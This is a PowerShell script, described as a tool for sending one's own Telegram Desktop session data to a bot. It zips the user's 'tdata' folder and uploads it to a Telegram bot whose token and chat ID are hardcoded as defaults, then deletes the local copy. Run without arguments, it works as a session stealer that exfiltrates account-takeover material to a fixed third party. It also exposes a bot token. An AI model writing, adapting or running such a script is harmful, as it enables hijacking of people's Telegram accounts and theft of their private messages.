<#
.SYNOPSIS
    Compress and send only Telegram Desktop session data via Telegram Bot

.DESCRIPTION
    This script collects your Telegram Desktop “tdata” folder,
    compresses it into a ZIP, and sends it as a document to your
    Telegram Bot.

.PARAMETER BotToken
    Your Telegram Bot token, e.g. "123456:ABC‑DEF…".

.PARAMETER ChatId
    The chat ID where the bot should send the file.

.PARAMETER OutFile
    Full path to the temporary ZIP file to create.

.EXAMPLE
    .\send_tgdata.ps1
    # uses defaults and sends C:\Users\<you>\tg_session.zip

    .\send_tgdata.ps1 -BotToken "123:ABC" -ChatId "987654321" -OutFile "D:\tg.zip"
#>

Param(
    [string]$BotToken = '6149645127:AAH6yTfAvHk6b3LAoKSENEXZgev4l5xBUVI',
    [string]$ChatId   = '956893993',
    [string]$OutFile  = "$env:USERPROFILE\tg_session.zip"
)

# Path to Telegram Desktop session folder
$tdataPath = Join-Path $env:APPDATA 'Telegram Desktop\tdata\*'

# Ensure Telegram is closed so files aren't locked
Write-Host "Compressing Telegram session data..."
Compress-Archive -LiteralPath $tdataPath -DestinationPath $OutFile -Force

# Send the ZIP to your bot
Write-Host "Sending session archive to Telegram..."
$wc  = New-Object System.Net.WebClient
$uri = "https://api.telegram.org/bot$BotToken/sendDocument?chat_id=$ChatId"
try {
    $wc.UploadFile($uri, 'POST', $OutFile) | Out-Null
    Write-Host "✅ Sent successfully!"
} catch {
    Write-Error "Failed to send: $_"
}

# Clean up
Remove-Item $OutFile -Force -ErrorAction SilentlyContinue
